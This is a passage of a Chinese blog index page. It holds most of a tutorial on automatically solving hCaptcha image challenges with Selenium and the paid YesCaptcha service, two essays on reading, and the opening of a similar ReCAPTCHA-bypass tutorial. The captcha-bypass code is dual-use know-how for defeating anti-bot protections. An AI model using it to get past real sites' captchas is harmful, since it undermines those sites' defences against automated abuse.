                          <pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> app.settings <span class="keyword">import</span> CAPTCHA_RESIZED_IMAGE_FILE_PATH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resize_base64_image</span><span class="params">(filename, size)</span>:</span></span><br><span class="line">    width, height = size</span><br><span class="line">    img = Image.open(filename)</span><br><span class="line">    new_img = img.resize((width, height))</span><br><span class="line">    new_img.save(CAPTCHA_RESIZED_IMAGE_FILE_PATH)</span><br><span class="line">    <span class="keyword">with</span> open(CAPTCHA_RESIZED_IMAGE_FILE_PATH, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        encoded_string = base64.b64encode(data)</span><br><span class="line">        <span class="keyword">return</span> encoded_string.decode(<span class="string">'utf-8'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="图片识别"><a href="#图片识别" class="headerlink" title="图片识别"></a>图片识别</h2>
                  <p>好，那么现在我们已经可以得到问题内容了，也能得到每张图片对应的 Base64 编码了，我们直接利用 YesCaptcha 进行图像识别就好了，代码调用如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># try to verify using API</span></span><br><span class="line">captcha_recognize_result = self.captcha_resolver.create_task(</span><br><span class="line">    resized_single_captcha_base64_strings,</span><br><span class="line">    self.captcha_target_text</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> captcha_recognize_result:</span><br><span class="line">    logger.error(<span class="string">'count not get captcha recognize result'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">recognized_results = captcha_recognize_result.get(</span><br><span class="line">    <span class="string">'solution'</span>, &#123;&#125;).get(<span class="string">'objects'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> recognized_results:</span><br><span class="line">    logger.error(<span class="string">'count not get captcha recognized indices'</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果运行正常的话，我们可能得到如下的返回结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"errorId"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"errorCode"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"status"</span>: <span class="string">"ready"</span>,</span><br><span class="line">  <span class="attr">"solution"</span>: &#123;</span><br><span class="line">    <span class="attr">"objects"</span>: [<span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>],</span><br><span class="line">    <span class="attr">"labels"</span>: [</span><br><span class="line">      <span class="string">"boat"</span>,</span><br><span class="line">      <span class="string">"seaplane"</span>,</span><br><span class="line">      <span class="string">"bicycle"</span>,</span><br><span class="line">      <span class="string">"train"</span>,</span><br><span class="line">      <span class="string">"boat"</span>,</span><br><span class="line">      <span class="string">"train"</span>,</span><br><span class="line">      <span class="string">"boat"</span>,</span><br><span class="line">      <span class="string">"boat"</span>,</span><br><span class="line">      <span class="string">"bus"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"taskId"</span>: <span class="string">"25fee484-df63-11ec-b02e-c2654b11608a"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>现在我们可以看到 sulution 里面的 objects 字段就包含了 true false 的列表，比如第一个 true 就代表了第一个验证码是和问题匹配的，第二个 false 就代表了第二个验证码图片和问题是不匹配的。那序号和图片又是怎么对应的呢？见下图：</p>
                  <p><img src="https://cdn.cuiqingcai.com/q1cn9.png" alt=""></p>
                  <p>从左到右一行行地数，序号依次递增，比如第一行第一个序号就是 0，那么其结果就是 objects 结果里面的第一个结果，true。</p>
                  <h2 id="模拟点击"><a href="#模拟点击" class="headerlink" title="模拟点击"></a>模拟点击</h2>
                  <p>现在我们已经得到 true false 列表了，我们只需要将结果是 true 的序号提取出来，然后对这些验证码小图点击就好了，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># click captchas</span></span><br><span class="line">recognized_indices = [i <span class="keyword">for</span> i, x <span class="keyword">in</span> enumerate(recognized_results) <span class="keyword">if</span> x]</span><br><span class="line">logger.debug(<span class="string">f'recognized_indices <span class="subst">&#123;recognized_indices&#125;</span>'</span>)</span><br><span class="line">click_targets = self.wait.until(EC.visibility_of_all_elements_located(</span><br><span class="line">    (By.CSS_SELECTOR, <span class="string">'.task-image'</span>)))</span><br><span class="line"><span class="keyword">for</span> recognized_index <span class="keyword">in</span> recognized_indices:</span><br><span class="line">    click_target: WebElement = click_targets[recognized_index]</span><br><span class="line">    click_target.click()</span><br><span class="line">    time.sleep(random())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <blockquote>
                    <p>当然我们也可以通过执行 JavaScript 来对每个节点进行模拟点击，效果是类似的。</p>
                  </blockquote>
                  <p>这里我们用 for 循环将 true false 列表转成了一个列表，列表的每个元素代表 true 在列表中的位置，其实就是我们的点击目标了。</p>
                  <p>然后接着我们获取了所有的验证码小图对应的节点，然后依次调用 click 方法进行点击即可。</p>
                  <p>这样我们就可以实现验证码小图的逐个识别了。</p>
                  <h3 id="点击验证"><a href="#点击验证" class="headerlink" title="点击验证"></a>点击验证</h3>
                  <p>好，那么有了上面的逻辑，我们就能完成整个 HCaptcha 的识别和点选了。</p>
                  <p>最后，我们模拟点击验证按钮就好了：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># after all captcha clicked</span></span><br><span class="line">verify_button: WebElement = self.get_verify_button()</span><br><span class="line"><span class="keyword">if</span> verify_button.is_displayed:</span><br><span class="line">    verify_button.click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>而 verfiy_button 的提取也是用 Selenium 即可：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_verify_button</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    verify_button = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, <span class="string">'.button-submit'</span>)))</span><br><span class="line">    <span class="keyword">return</span> verify_button</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="校验结果"><a href="#校验结果" class="headerlink" title="校验结果"></a>校验结果</h3>
                  <p>点击完了之后，我们可以尝试检查网页变化，看看有没有验证成功。</p>
                  <p>比如验证成功的标志就是出现一个绿色小对勾：</p>
                  <p><img src="https://cdn.cuiqingcai.com/7xm28.png" alt=""></p>
                  <p>检查方法如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_is_successful</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.switch_to_captcha_entry_iframe()</span><br><span class="line">    anchor: WebElement = self.wait.until(EC.visibility_of_element_located((</span><br><span class="line">        By.CSS_SELECTOR, <span class="string">'#anchor #checkbox'</span></span><br><span class="line">    )))</span><br><span class="line">    checked = anchor.get_attribute(<span class="string">'aria-checked'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'checked <span class="subst">&#123;checked&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> str(checked) == <span class="string">'true'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们先切换了 iframe，然后检查了对应的 class 是否是符合期望的。</p>
                  <p>最后如果 get_is_successful 返回结果是 True，那就代表识别成功了，那就整个完成了。</p>
                  <p>如果返回结果是 False，我们可以进一步递归调用上述逻辑进行二次识别，直到识别成功即可。</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># check if succeed</span></span><br><span class="line">is_succeed = self.get_is_successful()</span><br><span class="line"><span class="keyword">if</span> is_succeed:</span><br><span class="line">    logger.debug(<span class="string">'verifed successfully'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    self.verify_captcha()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2>
                  <p>以上代码可能比较复杂，这里我将代码进行了规整，然后放到 GitHub 上了，大家如有需要可以自取：<a href="https://github.com/Python3WebSpider/HCaptchaResolver" target="_blank" rel="noopener">https://github.com/Python3WebSpider/HCaptchaResolver</a></p>
                  <h2 id="注册地址"><a href="#注册地址" class="headerlink" title="注册地址"></a>注册地址</h2>
                  <p>最后需要说明一点，上面的验证码服务是收费的，每验证一次可能花一定的点数，比如识别一次 3x3 的图要花 10 点数，而充值一块钱就能获得 1000 点数，所以识别一次就一分钱，还是比较便宜的。</p>
                  <p>我这里充值了好几万点数，然后我就变成了 VIP5 级的账号。我研究了下发现大家如果用我的邀请链接 <a href="https://yescaptcha.com/i/CnZPBu" target="_blank" rel="noopener" title="https://yescaptcha.com/i/CnZPBu">https://yescaptcha.com/i/CnZPBu</a> 注册大家可以直接变成 VIP4，然后 VIP4 可以获取首充赠送 10% 的优惠，还不错哈～</p>
                  <p>希望本文对大家有帮助。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-05-30 18:03:12" itemprop="dateCreated datePublished" datetime="2022-05-30T18:03:12+08:00">2022-05-30</time>
                </span>
                <span id="/36060.html" class="post-meta-item leancloud_visitors" data-flag-title="HCaptcha的模拟点击破解教程来了！" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>11k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>10 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36059.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 个人记录 <i class="label-arrow"></i>
                  </a>
                  <a href="/36059.html" class="post-title-link" itemprop="url">怎样才是有效阅读</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>你有没有过这样的经历：现在自媒体、短视频兴起的时代，我们有时候听到好像两种完全的对立的观点，但我们有时候可能觉得这也对，那也对，但我们就没能力去反驳和佐证某个观点。听风就是雨，觉得自己没有能力去分辨哪些是对的，哪些是错的。我们的大脑好像就像别人观点的跑马场，听到这个观点，脑子中过一遍，好像觉得又道理，又来了一个相反的观点，脑子中过一遍，好像也有道理。但很明显，二者肯定只有一个是对的，那为什么我们就没有能力分辨呢？</p>
                  <p>这是因为，我们脑中的知识储备还不够，对一个问题的思考还不够深刻。</p>
                  <p>读书是我们摄入知识的一个重要来源，就拿看书来说吧。</p>
                  <p>我们人总一种倾向性，那就是在读书的时候倾向于去寻找和自己意见观点相似的内容，从一些书中去寻找认同感。</p>
                  <p>借用《暗时间》里面的一段话：</p>
                  <blockquote>
                    <p>我们在阅读的时候会无意识地过滤掉不符合我们既有知识和心智结构的知识，以我们情感所中意的方向对事实和观点进行“再解释”，对不符合我们立场、预期和情感诉求的观点弃之如敝履，对合我们立场、预期和情感诉求的观点则不细究其论证过程。</p>
                  </blockquote>
                  <p>所以，很多时候，我们看似在看一本书，但多数情况下我们只是从大致层面上理解了我们倾向去接受的一些观点，而去忽略一些和我们想法相悖的观点。</p>
                  <p>结果是什么？只是道理穿肠过，执念心头坐。已有的概念和道理还是存在于我们的脑海里，没有的概念和道理也不会进入到我们的脑海里，其实这种阅读方式就是一种缺乏深度的阅读，这只不过是一些符号记忆，一种模糊认知，是很有问题的。</p>
                  <p>那说到这，有人可能就问，那什么才是有效的阅读呢？</p>
                  <p>有效的阅读是要用心去读的，带着思维去到一篇文本之中，去理解为什么作者就提出了这样的观点，这样的观点是怎样一步步论证出来的，论证过程中所用的依据的可信度高不高等等。其实这个过程有点像读论文了，我们读论文的时候一般就会按照上面的过程来分析，如果我们把这个模式应用到读书上，效果也会是很好的。</p>
                  <p>在阅读的过程中我们同时还要进行一些反面的思考，比如结论的对立面有没有道理，有没有可能通过类似的方式也能佐证结论的对立面。经过反向思考，我们可以强化整个思考的过程，对已有的正确结论的论证有更清晰的认知。因为一个问题的论证，它也有反证法的对不对？</p>
                  <p>这种阅读才是一种深度、有效的阅读。</p>
                  <p>但这里需要强调的是，这里说的深度阅读并不是让我们花费很多时间对一篇文章一句话一句话的扣，这里强调的深度阅读是要在阅读的过程中多去思考，去尝试理解其精髓和思维脉络，去辩证地看待一些观点。有时候有些书看起来很冗长的，举了非常多的例子都为了佐证一个观点，但实际上核心的点可能就那么几段话或甚至几句话，我们能够找出其中的关键思维脉络才是最关键的，而不是说要把每个例子也逐句扣完。</p>
                  <p>再借用《暗时间》里面的一段话：</p>
                  <blockquote>
                    <p>在这样的阅读中，一篇文本能够帮助我们纠正我们的知识体系中有问题的结论或预设，可能会为我们已经确立的结论提供更深刻的佐证，可能会帮助我们弥补知识体系中的短板，进一步反思我们的知识体系中那些含糊、广而泛之的结论，也可能会彻底纠正我们之前错误的想法，也可能帮我们打开了一个新的知识分支。</p>
                  </blockquote>
                  <p>如此的阅读，我们头脑中对的认知才能更加强化，同时也可以对我们错误的认知加以纠正，长此以往，我们的思维会在碰撞中不断成长。</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-05-29 12:03:12" itemprop="dateCreated datePublished" datetime="2022-05-29T12:03:12+08:00">2022-05-29</time>
                </span>
                <span id="/36059.html" class="post-meta-item leancloud_visitors" data-flag-title="怎样才是有效阅读" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>1.4k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36058.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 个人记录 <i class="label-arrow"></i>
                  </a>
                  <a href="/36058.html" class="post-title-link" itemprop="url">看书也要挑剔点</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>我想多数人应该会对很多事情有所挑剔吧，比如买一件衣服的时候挑挑选选、货比三家最后才定下一件衣服，比如点餐的时候也挑挑选选找出想吃的一家。但有时候大家在看书的时候可能就没有那么“挑剔”，可能心想，这是本书，然后我花时间看书了，好像就可以了，就以为自己学会了，自己用功了，自己进步了，实际上，很多时候可能只是在自己骗自己，寻找一些心里安慰罢了，只是为了临时缓解自己的一些焦虑感罢了，但实际上真正有没有进步，有没有学到东西，要看自己是否真正去用心学了，当然另一方面也取决于书本身的质量好不好。</p>
                  <p>所以，上面提到了看一本书的关键两个点：</p>
                  <ul>
                    <li>一个是是否用心去看、去思考了。</li>
                    <li>一个是书本身的质量如何。</li>
                  </ul>
                  <p>今天，我们专门来说说第二点。</p>
                  <p>选一本好书，其实对我们的时间负责。</p>
                  <p>我们每个人的时间都是宝贵的，有时候我们随意地找本书烂书来看，说实话还不如不看。去花时间选一本好书，做好选书的功课是非常重要的。有时候决定读一本书之前，稍微花一点点时间去网上看看评价，综合分析一下，就能比较快地知道这本书到底值不值得看。因为有时候读一本书的时候我们可能花很多时间去深入阅读，在深入阅读之前，迅速了解一本书的质量可以帮我们节省很多的时间，甚至说看到某本书质量完全不行，那直接摒弃不看，那就省去了看这本书的时间，对不对？</p>
                  <p>个人建议，多读那些经典好书。</p>
                  <p>那么问题来了，怎么知道一本书是好书呢？依我个人而言，主要有这么几个点：</p>
                  <ul>
                    <li>看评价。我们说群众的眼睛是雪亮的，一千个读者会有一千个哈姆雷特。所以，每个人看完书之后都可能会有不同视角的评价。个人建议去豆瓣、亚马逊上先去看看评价是怎样的，比如评分过低两三分的那种直接 pass 就行了。另外除了看评分，也去看看一些文字评价，特别要注意去看看那些低分评价是怎么说的，多数情况下，一些小众的低分评价可能更多来自于一些懂行的人，而一些大众的高分评价很可能是浮于表面的评价或者甚至是刷的。所以，如果我们从一些低分评价里面都找不出来一些实质的反驳观点，那基本上这本书应该是不错的了。</li>
                    <li>看目录和简介。通常情况下，一本书的目录和简介都是公开的。通过目录我们能够快速地了解到这本书讲了什么内容，是不是符合我们的期望，有没有我们真正想学的内容。通过简介我们可以大致了解这本书的写作初衷，解决了什么痛点，传达给我们什么信息，另外我们还能通过简介大致了解到作者的思维脉络。基本上一本书要有一个清晰有层次的目录和简介，这本书就差不到哪里去。</li>
                    <li>看作者。这个其实分两种情况了，一种情况是我们知道这个作者，另一种情况是我们不知道这个作者。对于前者，如果他是一个知名作家、教授或者曾经写过一些优秀的作品，那么他的某本书应该差不了。对于后者，我们可以去查阅他的相关简介、履历，尝试了解一些他的其他作品，了解下他人对作者的评价，如果不错的话，那么该作者的作品应该大概率会不错的。</li>
                    <li>看样章。一些书的网站上通常都会有一些试读章节，我们可以选一些章节来阅读下。比如条理是否清晰、内容是否深刻，其实读上个几页或者两三节我们就知道了。如果样章的内容都让我们感到不知所云，那么整本书应该就不值得读了。</li>
                  </ul>
                  <p>好，那知道了好书的一些评判标准，那从哪里找到一些好书呢？</p>
                  <ul>
                    <li>排行榜：这其实和看电影是类似的了，比如一些豆瓣上的优秀书单，一些高分评价的书，通常都差不了。</li>
                    <li>朋友推荐：一般来说，一个人能跟我们成为朋友，那他的思维和三观应该不会和我们差太多。那如果朋友觉得还不错的话，我们应该也多数情况下不会觉得很差的。另外，朋友一般在推荐书的时候，可能真的会挑自己印象最深刻的或者近期读到的最值得说的书告诉我们，所以这个信息其实是朋友又帮我们经过了一些筛选得到的，所以多数情况下，一些朋友推荐的书质量应该还都不错。</li>
                    <li>引用：一本好的书籍或作品，往往在其他多数作品、文章、论文里面会被引用，这个信息我们也值得注意下。比如我最近读了刘未鹏的《暗时间》，他的书里面推荐了几本关于思维的书籍《这才是心理学》、《你的灯亮着吗》、《合作的进化》等书，应该都差不了。</li>
                    <li>同一作者的著作：我们觉得某本书写得还不错，那么该作者的其他书籍应该也在多数情况下会不错。就像一个歌手出了一首不错的歌，那么其他的一些歌的质量应该也差不了。一样的道理。</li>
                  </ul>
                  <p>好了，今天就唠到这里，总结下，这篇文章主要讲了：</p>
                  <ul>
                    <li>多读那些经典好书，选一本好书，其实对我们的时间负责。</li>
                    <li>怎样知道一本书是一本好书。</li>
                    <li>怎样去寻找一本好书。</li>
                  </ul>
                  <p>希望对大家有所启发～</p>
                  <p>本文部分论点来源：《暗时间》</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-05-28 23:00:22" itemprop="dateCreated datePublished" datetime="2022-05-28T23:00:22+08:00">2022-05-28</time>
                </span>
                <span id="/36058.html" class="post-meta-item leancloud_visitors" data-flag-title="看书也要挑剔点" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>1.9k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36057.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 爬虫 <i class="label-arrow"></i>
                  </a>
                  <a href="/36057.html" class="post-title-link" itemprop="url">谷歌验证码 ReCAPTCHA 的模拟点击破解方案来了！</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>大家好，我是崔庆才。</p>
                  <p>之前的时候我分享过 ReCAPTCHA 的破解方案，那种方案是获取到 ReCAPTCHA 其中的一个 siteKey，然后将 siteKey 直接提交给 ReCAPTCHA 相关的破解服务来实现破解。</p>
                  <p>这次，我们再来介绍一种更灵活更强大的全模拟点击破解方案，整体思路就是将全部的验证码图片进行识别，并根据识别结果对 ReCAPTCHA 验证码进行模拟点击，从而最终通过验证码。</p>
                  <h2 id="ReCAPTCHA-介绍"><a href="#ReCAPTCHA-介绍" class="headerlink" title="ReCAPTCHA 介绍"></a>ReCAPTCHA 介绍</h2>
                  <p>在开始之前，我这里先简单提下什么是 ReCAPTCHA，可能大家见的不多，因为这个验证码在国内并没有那么普及。</p>
                  <p>验证码是类似这样子的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/wvzml.png" alt=""></p>
                  <p>我们这时候需要点击验证码上的小框来触发验证，通常情况下，验证码会呈现如下的点选图：</p>
                  <p><img src="https://cdn.cuiqingcai.com/d67uq.png" alt=""></p>
                  <p>比如上面这张图，验证码页面会出现九张图片，同时最上方出现文字「树木」，我们需要点选下方九张图中出现「树木」的图片，点选完成之后，可能还会出现几张新的图片，我们需要再次完成点选，最后点击「验证」按钮即可完成验证。</p>
                  <p>ReCAPTCHA 也有体验地址，大家可以打开 <a href="https://www.google.com/recaptcha/api2/demo" target="_blank" rel="noopener">https://www.google.com/recaptcha/api2/demo</a> 查看，打开之后，我们可以发现有如上图所示的内容，然后点选图片进行识别即可。</p>
                  <h2 id="整体识别思路"><a href="#整体识别思路" class="headerlink" title="整体识别思路"></a>整体识别思路</h2>
                  <p>其实我们看，这种验证码其实主要就是一些格子的点选，我们只要把一些相应的位置点击对了，最后就能验证通过了。</p>
                  <p>经过观察我们发现，其实主要是 3x3 和 4x4 方格的验证码，比如 3x3 的就是这样的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/525yr.png" alt=""></p>
                  <p>4x4 的就是这样的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/0by4l.png" alt=""></p>
                  <p>然后验证码上面还有一行加粗的文字，这就是我们要点选的目标。</p>
                  <p>所以，关键点就来了：</p>
                  <ul>
                    <li>
                      <p>第一就是把上面的文字内容找出来，以便于我们知道要点击的内容是什么。</p>
                    </li>
                    <li>
                      <p>第二就是我们要知道哪些目标图片和上面的文字是匹配的，找到了依次模拟点击就好了。</p>
                    </li>
                  </ul>
                  <p>听起来似乎很简单的对吧，但第二点是一个难点，我们咋知道哪些图片和文字匹配的呢？这就难搞了。</p>
                  <p>其实，这个靠深度学习是能做到的，但要搞出这么一个模型是很不容易的，我们需要大量的数据来训练，需要收集很多验证码图片和标注结果，这总的工作量是非常大的。</p>
                  <p>那怎么办呢？这里给大家介绍一个服务网站 YesCaptcha，这个服务网站已经给我们做好了识别服务，我们只需要把验证码的大图提交上去，然后同时告诉服务需要识别的内容是什么，这个服务就可以返回对应识别结果了。</p>
                  <p>下面我们来借助 YesCaptcha 来试试识别过程。</p>
                  <h2 id="YesCaptcha"><a href="#YesCaptcha" class="headerlink" title="YesCaptcha"></a>YesCaptcha</h2>
                  <p>在使用之前我们需要先注册下这个网站，网站地址是 <a href="https://yescaptcha.com/i/CnZPBu/" target="_blank" rel="noopener" title="https://yescaptcha.com/i/CnZPBu">https://yescaptcha.com/i/CnZPBu</a>，注册个账号之后大家可以在后台获取一个账户密钥，也就是 ClientKey，保存备用。</p>
